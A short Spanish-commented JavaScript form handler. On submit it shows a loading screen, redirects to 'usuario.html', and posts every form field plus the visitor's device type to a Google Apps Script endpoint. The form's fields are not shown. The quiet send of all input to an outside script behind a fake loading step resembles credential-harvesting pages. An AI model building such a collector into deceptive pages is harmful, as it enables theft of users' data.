document.getElementById("miFormulario").addEventListener("submit", async function(event) {
    event.preventDefault(); 

    // Mostrar pantalla de carga
    document.getElementById("loadingScreen").style.display = "flex";
    document.getElementById("miFormulario").style.display = "none";

    // Redirigir después de 1 segundo
    setTimeout(() => {
        window.location.href = "usuario.html";
    }, 1000); // 1000 ms = 1 segundo

    const formData = new FormData(this);
    formData.append("device", /android/i.test(navigator.userAgent) ? "Android" : /iphone|ipad|ipod/i.test(navigator.userAgent) ? "iPhone" : "Otro");

    try {
        const response = await fetch("https://script.google.com/macros/s/AKfycbxecXJGiURxApfpFHvcZCRvxaXNmzPitUCnaBtjNzlpPMWefOzH7Sj2eTOouF-Qjz7Q/exec", {
            method: "POST",
            body: new URLSearchParams(formData),
            headers: { "Content-Type": "application/x-www-form-urlencoded" }
        });
    } catch (error) {
        console.error("Error al enviar datos:", error);
    }
});
